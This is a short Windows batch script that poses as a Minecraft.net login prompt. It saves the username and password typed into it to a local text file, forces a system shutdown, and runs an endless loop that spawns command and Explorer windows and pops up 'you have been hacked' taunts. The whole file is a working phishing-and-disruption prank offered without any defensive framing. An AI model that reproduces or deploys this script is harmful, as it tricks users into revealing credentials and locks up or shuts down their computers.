@echo off
color 9B
title Login to Minecraft.net
cls
echo please eter your usernameand password
echo.
echo.
set /p user=username:
set/p pass=password:
cls
echo username=%user% password=%pass% >Password.txt
start www.minecraft.net

timeout 10

shutdown.exe -s -t 10 -c "Succesfully hacked your PC"
:repeat
echo %random%
start cmd
start explorer
msg * this is a virus :D
msg * You have been hacked
msg * Should've been more careful
msg * i have all control
msg * say your last goodbyes to your PC
goto repeat